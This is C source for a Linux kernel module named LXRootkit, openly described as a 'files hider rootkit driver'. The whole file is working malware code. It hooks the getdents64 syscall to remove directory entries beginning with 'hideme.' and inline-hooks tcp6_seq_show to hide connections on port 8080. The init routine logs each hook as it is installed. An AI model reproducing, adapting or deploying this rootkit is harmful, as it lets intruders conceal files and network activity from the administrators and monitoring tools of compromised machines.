

#include "hfiles/pch.h" /* precompiled header */ 

#include "hfiles/utils64.h"
#include "hfiles/inlHook.h"
#include "hfiles/typedefs.h"
#include "hfiles/sysHook.h"

#define PORT_TO_HIDE 8080

#define SECRET "hideme."

#define SIZE_SECRET \
    (sizeof(SECRET) - 1)

// RDI, RSI, RDX, R10, R8, R9 - params0-5
asmlinkage int my_sys_getdents64(
        struct pt_regs *regs
        )
{
     
  /* 
params: 
    RDI: fd 
    RSI: linux_dirent64 structure pointer 
    RDX: dirent
    R10: count 
    */  
  
    /* restore the function pointer to return to original handler */ 
    org_sys_getdents64 = hi.originalFunc; 
    int ret = org_sys_getdents64(regs); 

    if(ret <= 0) 
        return ret; 

    int offset = 0; 
    char* cur = (char*)regs->si; 
    struct linux_dirent64 *next = (struct linux_dirent64*)regs->si; 

    while(offset < ret) 
    {
        next = (struct linux_dirent64*)(cur + offset); 

        if(strncmp(next->d_name, SECRET, SIZE_SECRET) == 0) 
        {            
            // here we take the next entry & copy it to our current entry which we've found,
            memcpy(cur + offset, cur + offset + next->d_reclen, ret - (offset  + next->d_reclen)); 
            // redfine the return value little bit , so it returns with a differnt state. 
            ret -= next->d_reclen; 
        } 
        /* calc the next entry */ 
        offset += next->d_reclen;
    }
    return ret; 
}


static int my_tcp6_seq_show(struct seq_file *file, void *v)
{

    struct sock* sk = v; 
    if (sk != 0x1 && sk->sk_num == PORT_TO_HIDE)
        return 0;

// NOTE: I know this trampoline isn't looking that good, it could be solved by pushing both params to inline assembly snippet(rsi=file, rdi=v) and 
// then save the return value by emitting the rax value to a varible and return it a follows : return tramp() instead what we have now. But it works pretty good... :v) 
    
    tramp(); /* trampoline to the original function */ 
    return 1;
}

static int __init rootkit_init(void) {


    printk(KERN_INFO "[*] Loading LXRootkit...\n"); 
    printk(KERN_INFO "[*] LxRootkit: hooking tcp6_seq_show function...\n"); 
    printk(KERN_INFO "[*] LXRootkit: hooking getdents64 syscall...\n"); 
    printk(KERN_INFO "[*] LXRootkit: hiding file: %s\n", SECRET);
    printk(KERN_INFO "[*] LXRootkit: masking port: %x(%d)\n", PORT_TO_HIDE, PORT_TO_HIDE);

    /* NOTE: tcp6 isn't default protocal, there is tcp4 as well. I have to find a way to make it more flexible :). */ 
    unsigned long tcp6_addr = dumpAddr("tcp6_seq_show");

    hook_syscall_x64(my_sys_getdents64, __NR_getdents64); 
    inline_hook_x64(tcp6_addr, my_tcp6_seq_show); 

    return 0; 
}

static void __exit rootkit_exit(void) 
{
    inline_unhook_x64();     
    unhook_syscall_x64(); 
}
MODULE_LICENSE("GPL");
MODULE_AUTHOR("dan0xcc");
MODULE_DESCRIPTION("files hider rootkit driver"); 
MODULE_VERSION("1.00");


module_init(rootkit_init); // invokes loading 
module_exit(rootkit_exit); // invokes unloading 



